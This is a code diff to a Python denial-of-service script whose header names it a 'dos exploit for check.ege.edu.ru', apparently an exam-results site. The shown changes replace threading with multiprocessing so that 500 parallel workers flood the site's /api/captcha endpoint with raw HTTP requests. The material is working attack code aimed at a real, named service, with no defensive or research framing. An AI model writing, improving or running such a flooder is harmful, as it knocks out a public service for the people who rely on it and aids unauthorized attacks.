@@ -3,7 +3,7 @@ dos exploit for check.ege.edu.ru
 '''
 
 import socket
-import threading
+import multiprocessing
 #If you want you can delete User-Agent and another headers
 
 payload = b'GET /api/captcha HTTP/1.1\r\n\
@@ -43,7 +43,7 @@ def dos():#Pretty simple dos
 t = []
 n = 500
 for i in range(n):
-        t.append(threading.Thread(target = dos))
+        t.append(multiprocessing.Process(target = dos))
 
 for i in range(n):
         t[i].start()
